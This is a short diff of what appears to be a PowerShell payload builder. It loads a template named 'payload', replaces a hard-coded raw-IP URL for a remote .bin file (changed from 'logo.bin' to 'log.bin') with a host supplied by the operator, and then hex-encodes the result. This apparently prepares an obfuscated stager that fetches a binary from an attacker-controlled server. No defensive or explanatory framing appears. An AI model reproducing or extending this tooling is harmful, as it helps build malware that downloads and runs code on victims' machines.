@@ -27,8 +27,8 @@ if (-not (Test-Path $templatePath)) {
 $payload = Get-Content -Path $templatePath -Raw -Encoding UTF8
 
 # Replace URL: only the host part (IP)
-$oldUrl = "http://45.83.140.12/pot/jack/logo.bin"
-$newUrl = "http://$Ip/pot/jack/logo.bin"
+$oldUrl = "http://45.83.140.12/log/log.bin"
+$newUrl = "http://$Ip/log/log.bin"
 $payload = $payload.Replace($oldUrl, $newUrl)
 
 # Encode payload to hex (UTF-8)
